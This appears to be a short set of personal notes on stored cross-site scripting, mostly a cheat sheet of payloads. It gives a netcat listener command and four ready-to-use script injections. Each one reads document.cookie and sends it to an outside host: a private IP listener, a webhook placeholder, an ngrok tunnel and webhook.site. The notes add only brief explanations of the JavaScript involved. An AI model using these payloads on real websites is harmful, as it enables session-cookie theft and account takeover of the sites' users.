
```sh
nc -nvlp 4444
```

stored xss

 `escape <p> tag first`

```html
</p> <script>new Image().src="http://192.168.57.5:4444/?"+ encodeURI(document.cookie);</script>
```

```html
</p><script>var i=new Image; i.src="webHookAddress/?"+document.cookie;</script>
```

new Image() contructor create an image object
it is similar to

document.createElement("image")

The encodeURIComponent() function encodes a URI by replacing each instance of certain characters by one, two, three, or four escape sequences representing the UTF-8

```js
fetch(`https://ae1c-43.ngrok-free.app?${encodeURIComponent(document.cookie)}`, { method: "get", headers: new Headers({ "ngrok-skip-browser-warning": true }) })
```

```js
<img src=x onerror=this.src='https://webhook.site/?c='.concat(document.cookie)>
```
